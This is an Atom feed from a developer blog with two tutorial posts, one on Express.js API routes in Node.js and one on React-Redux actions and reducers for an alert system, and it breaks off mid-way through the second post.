<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Jack McKew's Blog</title><link href="https://jackmckew.dev/" rel="alternate"></link><link href="https://jackmckew.dev/feeds/all.atom.xml" rel="self"></link><id>https://jackmckew.dev/</id><updated>2020-10-02T00:00:00+10:00</updated><subtitle>Engineer | Software Developer | Data Scientist</subtitle><entry><title>API Routes in Node.js</title><link href="https://jackmckew.dev/api-routes-in-nodejs.html" rel="alternate"></link><published>2020-10-02T00:00:00+10:00</published><updated>2020-10-02T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-10-02:/api-routes-in-nodejs.html</id><summary type="html">&lt;body&gt;&lt;p&gt;First off what's an API and more specifically what's an API route? API stands for Application Programming Interface, meaning it's how to communicate with the system you are creating. A route within an API is a specific path to take to get specific information or data out of. This post â€¦&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;First off what's an API and more specifically what's an API route? API stands for Application Programming Interface, meaning it's how to communicate with the system you are creating. A route within an API is a specific path to take to get specific information or data out of. This post will dive into how to set up API routes in Nodejs with express.&lt;/p&gt;
&lt;p&gt;We start by 'importing' express into our route and instantiating a router from the express library.&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;express&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'express'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;router&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;express&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Router&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;Typically we group API routes together in standalone javascript files. For example, if our application needed authentication for users logging in, we could create an &lt;code&gt;auth.js&lt;/code&gt; file which will contain all the API routes to do with authentication.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We need to import express and instantiate the router in each of the standalone javascript files.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Next we can create routes as straightforward as using the corresponding method within &lt;code&gt;router&lt;/code&gt;. Pending on the type of API that is being created, if you are using Express.js, it's mostly likely a web API and thus the methods follow HTTP method routes.&lt;/p&gt;
&lt;p&gt;The primary or most-commonly-used HTTP methods are:&lt;/p&gt;
&lt;table class="table table-striped"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Method Name&lt;/th&gt;
&lt;th&gt;Operation&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;Create&lt;/td&gt;
&lt;td&gt;Used for creating a new record of information&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;Read&lt;/td&gt;
&lt;td&gt;Used for retrieving information&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PUT&lt;/td&gt;
&lt;td&gt;Update&lt;/td&gt;
&lt;td&gt;Used for updating existing information&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DELETE&lt;/td&gt;
&lt;td&gt;Delete&lt;/td&gt;
&lt;td&gt;Used for deleting information&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;These 4 methods make up the basic CRUD functionality (Create, Read, Update and Delete) of an application.&lt;/p&gt;
&lt;h2 id="post"&gt;POST&lt;/h2&gt;
&lt;p&gt;Let's create a scaffold &lt;code&gt;POST&lt;/code&gt; method in node.js.&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'POST request to homepage'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;Similarly to do this asynchronously with arrow functions:&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;async&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'POST request to homepage'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;As we can see above, the first argument to our API route method is the path, and the following is the callback function (what should happen when this path is hit). The callback function can be a function, array of functions, series of functions (separated by commas), or a combination of all of them. This is useful if you are wanting to do validation before the final POST request is made. An example of this is:&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,[&lt;/span&gt;&lt;span class="nx"&gt;checkInputs&lt;/span&gt;&lt;span class="p"&gt;()],&lt;/span&gt; &lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'POST request to homepage and inputs are valid'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id="get"&gt;GET&lt;/h2&gt;
&lt;p&gt;All the methods within Express.js follow the same principles so to create a scaffold &lt;code&gt;GET&lt;/code&gt; request:&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'GET request to homepage'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id="put"&gt;PUT&lt;/h2&gt;
&lt;p&gt;Similarly:&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;put&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'PUT request to homepage'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id="delete"&gt;DELETE&lt;/h2&gt;
&lt;p&gt;Similarly:&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;delete&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'PUT request to homepage'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id="express-middleware"&gt;Express Middleware&lt;/h2&gt;
&lt;p&gt;All of the callback functions defined above are known as Middleware functions in Express.js. Middleware functions have access to 3 elements: &lt;code&gt;req&lt;/code&gt;, &lt;code&gt;res&lt;/code&gt;, and &lt;code&gt;next&lt;/code&gt;.&lt;/p&gt;
&lt;table class="table table-striped"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Argument&lt;/th&gt;
&lt;th&gt;Use&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;req&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;HTTP request, named &lt;code&gt;req&lt;/code&gt; by convention&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;res&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;HTTP response, named &lt;code&gt;res&lt;/code&gt; by convention&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;next&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;The next middleware function to be called&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;An example of using all of the arguments is:&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;async&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'GET request to homepage'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;By piecing together many of these API routes (also known as endpoints) we can build a functional API that can drive our applications. For example, the application in the end may make a &lt;code&gt;GET&lt;/code&gt; request to get all the latest posts by other users, and makes a &lt;code&gt;POST&lt;/code&gt; request when you add a new post, and so on with all the different types of API routes.&lt;/p&gt;&lt;/body&gt;</content><category term="Javascript"></category><category term="javascript"></category></entry><entry><title>Actions and Reducers in React-Redux</title><link href="https://jackmckew.dev/actions-and-reducers-in-react-redux.html" rel="alternate"></link><published>2020-09-25T00:00:00+10:00</published><updated>2020-09-25T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-25:/actions-and-reducers-in-react-redux.html</id><summary type="html">&lt;body&gt;&lt;p&gt;Redux is a &lt;em&gt;predictable state container for JavaScript applications&lt;/em&gt;, and React is &lt;em&gt;a JavaScript library for building user interfaces&lt;/em&gt;. To bridge the two, you get &lt;code&gt;react-redux&lt;/code&gt; which allows our user interfaces to interact &amp;amp; respond to the current state of the application.&lt;/p&gt;
&lt;p&gt;In this post let's go into actions and reducers â€¦&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;Redux is a &lt;em&gt;predictable state container for JavaScript applications&lt;/em&gt;, and React is &lt;em&gt;a JavaScript library for building user interfaces&lt;/em&gt;. To bridge the two, you get &lt;code&gt;react-redux&lt;/code&gt; which allows our user interfaces to interact &amp;amp; respond to the current state of the application.&lt;/p&gt;
&lt;p&gt;In this post let's go into actions and reducers. First off, what is an action and what is a reducer in this context? &lt;strong&gt;Actions&lt;/strong&gt; are payloads of information that send data from the application to the redux store. &lt;strong&gt;Reducers&lt;/strong&gt; specify how the application's state changes in response to actions sent to the store. It is summarized in the graphic:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Redux State Diagram" class="img-fluid" src="https://jackmckew.dev/img/redux-diagram.png"/&gt;&lt;/p&gt;
&lt;p&gt;Let's use &lt;code&gt;react-redux&lt;/code&gt; to build a system which we can alert users when things trigger. For this we will need to build an action, a reducer and a component to display the alert.&lt;/p&gt;
&lt;p&gt;To ensure that these three components are speaking the same language, we need to initialise types which will represent the states being passed around. These variables contain a string. For our alert system we need two variables&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;export&lt;/span&gt; &lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;SET_ALERT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"SET_ALERT"&lt;/span&gt;
&lt;span class="kr"&gt;export&lt;/span&gt; &lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;REMOVE_ALERT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"REMOVE_ALERT"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id="action"&gt;Action&lt;/h2&gt;
&lt;p&gt;We'll start by creating the action which will signify when an alert is triggered. We want all of our alerts to be unique so multiple alerts can handled without a problem which we will use &lt;code&gt;uuid&lt;/code&gt;.&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;v4&lt;/span&gt; &lt;span class="nx"&gt;as&lt;/span&gt; &lt;span class="nx"&gt;uuid&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"uuid"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;SET_ALERT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;REMOVE_ALERT&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"../actions/types.jsx"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kr"&gt;export&lt;/span&gt; &lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;setAlert&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;alertType&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;timeout&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dispatch&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;uuid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="nx"&gt;dispatch&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
    &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;SET_ALERT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;alertType&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;id&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="p"&gt;});&lt;/span&gt;

  &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
      &lt;span class="nx"&gt;dispatch&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
        &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;REMOVE_ALERT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="p"&gt;}),&lt;/span&gt;
    &lt;span class="nx"&gt;timeout&lt;/span&gt;
  &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;The action is declared as a function, which takes in 3 arguments (2 required): &lt;code&gt;msg&lt;/code&gt;, &lt;code&gt;alertType&lt;/code&gt; and &lt;code&gt;timeout&lt;/code&gt;. Which we then use call the dispatch function with an object constructed from the arguments, and then after a specified timeout we dispatch another object to remove the same alert.&lt;/p&gt;
&lt;p&gt;Note that we curry the dispatch function in this case, this is only possible from using the middleware &lt;code&gt;redux-thunk&lt;/code&gt;, which can also be represented as:&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;setAlert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;alertType&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dispatch&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="nx"&gt;dispatch&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;ACTION_TYPE&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;There is a much more fleshed out answer to how the currying works out in the end over at: &lt;a href="https://stackoverflow.com/questions/35411423/how-to-dispatch-a-redux-action-with-a-timeout/35415559#35415559"&gt;https://stackoverflow.com/questions/35411423/how-to-dispatch-a-redux-action-with-a-timeout/35415559#35415559&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="component"&gt;Component&lt;/h2&gt;
&lt;p&gt;We need to be able to somehow show the alert on the page to the user. There is a very little chance that the user will sit in the console and monitor the state of a redux component changing (for which the &lt;a href="https://addons.mozilla.org/en-US/firefox/addon/reduxdevtools/"&gt;Redux Devtools Extension&lt;/a&gt; is useful). &lt;/p&gt;
&lt;p&gt;Let's display the alert as a &lt;code&gt;div&lt;/code&gt;, with colouring to match the type.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This post won't go into detail around how to build a React component, which you can find over at another post: [INSERT REACT COMPONENT POST]&lt;/p&gt;
&lt;/blockquote&gt;
